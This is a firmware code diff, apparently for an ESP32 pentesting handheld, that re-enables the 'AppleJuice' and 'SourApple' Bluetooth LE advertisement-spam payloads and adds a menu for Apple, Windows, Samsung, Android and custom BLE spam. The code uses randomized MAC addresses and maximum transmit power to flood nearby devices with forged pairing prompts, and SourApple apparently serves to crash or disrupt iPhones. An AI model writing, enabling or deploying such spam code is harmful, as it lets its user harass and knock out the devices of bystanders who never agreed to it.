@@ -237,16 +237,13 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
 }
 
 void executeSpam(EBLEPayloadType type) {
-    if (type == AppleJuice || type == SourApple) {
-        return;
-    }
     
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
 
     BLEDevice::init("");
-    vTaskDelay(5 / portTICK_PERIOD_MS);
+    vTaskDelay(50 / portTICK_PERIOD_MS);
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     pAdvertising = BLEDevice::getAdvertising();
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
@@ -259,10 +256,10 @@ void executeSpam(EBLEPayloadType type) {
     pAdvertising->setMinInterval(32);
     pAdvertising->setMaxInterval(48);
     pAdvertising->start();
-    vTaskDelay(50 / portTICK_PERIOD_MS);
+    vTaskDelay(250 / portTICK_PERIOD_MS);
 
     pAdvertising->stop();
-    vTaskDelay(5 / portTICK_PERIOD_MS);
+    vTaskDelay(50 / portTICK_PERIOD_MS);
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
     esp_bt_controller_deinit();
 #else
@@ -437,6 +434,15 @@ void aj_adv(int ble_choice) {
             case 6:
                 displayTextLine("Spamming " + spamName + "(" + String(count) + ")");
                 executeCustomSpam(spamName);
+                break;
+            case 7:
+                displayTextLine("SourApple " + String(count));
+                executeSpam(SourApple);
+                break;
+            case 8:
+                displayTextLine("AppleJuice " + String(count));
+                executeSpam(AppleJuice);
+                break;
         }
         count++;
 
@@ -445,7 +451,6 @@ void aj_adv(int ble_choice) {
             break;
         }
     }
-
     BLEDevice::init("");
     vTaskDelay(100 / portTICK_PERIOD_MS);
     pAdvertising = nullptr;
@@ -455,4 +460,18 @@ void aj_adv(int ble_choice) {
 #else
     BLEDevice::deinit();
 #endif
+}
+
+void spamMenu() {
+    std::vector<Option> options;
+
+    options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
+    options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
+    options.push_back({"Samsung Spam", lambdaHelper(aj_adv, 3)});
+    options.push_back({"Android Spam", lambdaHelper(aj_adv, 4)});
+    options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
+    options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
+    options.push_back({"Back", []() { returnToMenu = true; }});
+     
+    loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
 }
